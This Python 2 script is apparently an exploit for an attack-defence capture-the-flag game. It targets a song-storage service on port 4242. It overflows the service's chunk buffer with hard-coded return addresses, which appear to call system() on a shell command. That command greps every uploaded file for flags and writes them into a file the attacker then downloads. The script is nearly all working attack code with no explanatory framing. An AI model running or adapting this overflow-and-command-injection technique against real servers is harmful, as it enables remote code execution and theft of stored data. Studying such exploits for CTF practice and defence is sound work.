#!/usr/bin/python

import random
import socket
import re
import sys
import os
import string
import shutil
import time
from glob import glob
from uuid import UUID
from struct import pack, unpack

CHUNK_SIZE = 32 * 1024 - 1

REQUEST_PUT = 0
REQUEST_GET = 1

RESPONSE_OK    = 0
RESPONSE_ERROR = 1

SERVICE_PORT = 4242

SOCKET_TIMEOUT = 2000

FLAG_TTL = 3 * 60

def send_chunked_data(sock, data):
	for i in range((len(data) + CHUNK_SIZE - 1) / CHUNK_SIZE):
		chunk_offset = i * CHUNK_SIZE
		chunk_length = min(CHUNK_SIZE, len(data) - chunk_offset)
		sock.sendall(pack('h', chunk_length))
		sock.sendall(data[chunk_offset: chunk_offset + chunk_length])
	sock.sendall(pack('h', 0))

def send_exploit_data(sock, cont):
	cmdline = "cat uploads/* | grep -aoP 'FLAG=\w+' > uploads/" + cont
	data = cmdline + '\0' * (CHUNK_SIZE + 1 - len(cmdline) + 16)
	data += pack("I", 0xb6e83980)
	data += "aaaa"
	data += pack("I", 0x13dbc)
	data += "bbbb"
	data += pack("I", 0xb6e8bc34)
	sock.sendall(pack('H', len(data)))
	sock.sendall(data)
	sock.sendall(pack('h', 0))

def recv_chunked_data(sock):
	result = b''
	while True:
		chunk_length = unpack('h', sock.recv(2))[0]

		if chunk_length == 0:
			break
		next_chunk = b''
		while len(next_chunk) < chunk_length:
			next_chunk += sock.recv(chunk_length - len(next_chunk))

		result += next_chunk
	return result

def create_socket(addr, port):
	sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	sock.settimeout(SOCKET_TIMEOUT)
	sock.connect((addr, port))
	return sock

def put_song(addr, port, data):
	sock = create_socket(addr, port)

	sock.sendall(pack('B', REQUEST_PUT))
	sock.sendall(pack('h', FLAG_TTL))
	send_chunked_data(sock, data)

	status = unpack('B', sock.recv(1))[0]

	if status == RESPONSE_ERROR:
		return None

	uuid = UUID(bytes=sock.recv(16))

	return uuid
def put_xxx(addr, port, uuid):
	sock = create_socket(addr, port)

	sock.sendall(pack('B', REQUEST_PUT))
	sock.sendall(pack('h', FLAG_TTL))
	send_exploit_data(sock, str(uuid).replace('-', '_') + '.ogg')


def get_song(addr, port, uuid):
	sock = create_socket(addr, port)

	sock.sendall(pack('B', REQUEST_GET))
	sock.sendall(uuid.bytes)

	status = unpack('B', sock.recv(1))[0]

	if status == RESPONSE_ERROR:
		return None
	return recv_chunked_data(sock)

addr, port, path = sys.argv[1:4]
with open(path, 'rb') as f:
	data = f.read()
id = put_song(addr, int(port), data)
put_xxx(addr, int(port), id)
time.sleep(1)
data = get_song(addr, int(port), id)
print data
print str(id)
